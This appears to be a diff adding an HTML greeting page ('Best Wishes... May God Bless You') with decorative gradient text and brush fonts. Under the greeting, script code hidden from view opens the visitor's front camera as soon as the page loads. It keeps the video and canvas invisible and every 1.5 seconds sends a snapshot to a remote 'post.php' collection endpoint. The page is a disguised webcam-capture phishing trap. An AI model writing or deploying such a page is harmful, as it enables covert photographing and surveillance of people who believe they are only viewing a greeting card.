@@ -1,0 +1,145 @@
+<html>
+<head>
+<!----)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))script(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((--->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<fieldset>
+  <legend>  <h2 class="text_head">Best <br /> Wishes</h2></legend>
+  <h2 class="text">From My Side</h2>
+  <h2 class="text">May God </h2>
+  <h2 class="text">Bless You</h2>
+  <h2 class="text">Dear</h2>
+  <h2 class="text">Good Day</h2>
+</fieldset>
+<style>
+@font-face {
+  font-family: "my_font5";
+  src: url("https://raw.githubusercontent.com/MANOJ-M-01/Assets/main/fonts/FIGHTER%20BRUSH.ttf");
+}
+
+@font-face {
+  font-family: "my_font6";
+  src: url("https://raw.githubusercontent.com/MANOJ-M-01/Assets/main/fonts/Fusterd%20Brush.otf");
+}
+body{
+  background-color: rgb(14, 12, 12);
+  height:100vh;
+}
+fieldset{
+  width: max-content;
+  border: none;
+  outline: none;
+  box-shadow: 1px 1px 10px 2px #5E2A73;
+  margin: auto;
+  border-radius: 5px;
+  transition:all 0.35s ease-in-out
+}
+fieldset:hover{
+    box-shadow: 1px 1px 10px -1px #bd0835;
+  cursor:pointer;
+  transform: scale(1.03);
+}
+.text_head {
+  background: linear-gradient(to right, #5E2A73 0%, #bd0835 40%, #bd4a08 60%, #f0a608 90%);
+  width: max-content;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  font-family: my_font6;
+  font-size: 6em;
+  font-weight: 100;
+  padding: 20px 40px;
+  margin: 0;
+  line-height: 50px;
+  transform: rotateZ(-15deg);
+  margin-bottom: 30px;
+}
+
+.text {
+  background: linear-gradient(to right, #bd4a08 0%, #bd0835 40%, #f0a608 60%, #5E2A73 90%);
+  width: max-content;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  font-family: my_font5;
+  font-size: 2em;
+  font-weight: 100;
+  padding:0 10px 0 20px;
+  margin:0;
+
+
+}
+</style>
+<!---OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOandOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO--->
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</html>
